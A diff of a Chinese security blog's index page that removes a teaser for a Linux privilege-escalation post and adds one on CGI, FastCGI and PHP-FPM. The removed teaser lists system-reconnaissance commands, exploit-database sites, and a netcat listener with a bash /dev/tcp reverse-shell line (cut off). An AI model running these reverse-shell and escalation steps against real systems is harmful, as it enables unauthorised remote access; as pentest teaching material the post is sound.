@@ -66,65 +66,6 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="http://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/">Linux下系统漏洞提权</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    
-                        2016-08-09
-                    
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/intranet">intranet</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 Linux下的提权 Linux下一般都是系统漏洞提权，分为以下几个步骤：
-1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反弹shell 4. 尝试利用  0x01 提权  获取系统版本号  获取发行版本  cat /etc/*-release cat /etc/issue cat /etc/lsb-release cat /etc/redhat-release  获取内核版本  cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz   根据系统版本号找对应exp  http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules http://securityreason.com http://seclists.org/fulldisclosure http://www.google.com  反弹shell  本地：nc -l -p 8888 目标机器：/bin/bash -i &gt;&amp; /dev/tcp/10.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
         <h2><a href="http://wyb0.com/posts/2016/port-forwarding/">端口转发</a></h2>
 
         
@@ -663,6 +604,64 @@ $ cd /opt $ wget http://download.redis.io/releases/redis-3.2.3.tar.gz $ tar -zxv
 
 
             
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/2016/cgi-and-fastcgi-and-php-fpm/">CGI与FastCGI与PHP-FPM</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    
+                        2016-08-02
+                    
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/php">PHP</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/cgi">cgi</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         0x01 CGI协议 中间件在收到请求时会去找php解析器处理，cgi是规定了要传递哪些数据(比如url、header、post数据等)的协议
+0x02 FastCGI 服务端收到请求时会启动对应的cgi程序(如php-cgi)，即php的解析器，php解析器会解析php.ini文件、初始化执行环境，然后执行请求，每次都是这样，性能比较低
+fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执行环节，然后启动多个worker直接依次处理多个web server的连接，不用每次都解析php.ini等
+0x03 FastCGI工作流程 一般情况下，FastCGI的整个工作流程是这样的：
+ Web Server启动时载入FastCGI进程管理器（IIS ISAPI或Apache Module) FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可见多个php-cgi)并等待WebServer的连接。 当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。 Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。  0x04 PHP-FPM  php-fpm就是fastcgi的实现，是一个php fastcgi进程管理器 php-fpm在php5.2之后默认添加 千万不要把fastcgi端口对公网暴露  
+    </p>
+
+    
+</article>
+
+
+            
 
             
 
@@ -730,7 +729,7 @@ $ cd /opt $ wget http://download.redis.io/releases/redis-3.2.3.tar.gz $ tar -zxv
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/python" title="python">python(36)</a>
+                <a href="http://wyb0.com/topics/python" title="python">python(35)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -887,7 +886,7 @@ $ cd /opt $ wget http://download.redis.io/releases/redis-3.2.3.tar.gz $ tar -zxv
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/python" title="python">python</a>
-                <sup>34</sup>
+                <sup>33</sup>
             </p>
         
             <p style="display:inline-block;">
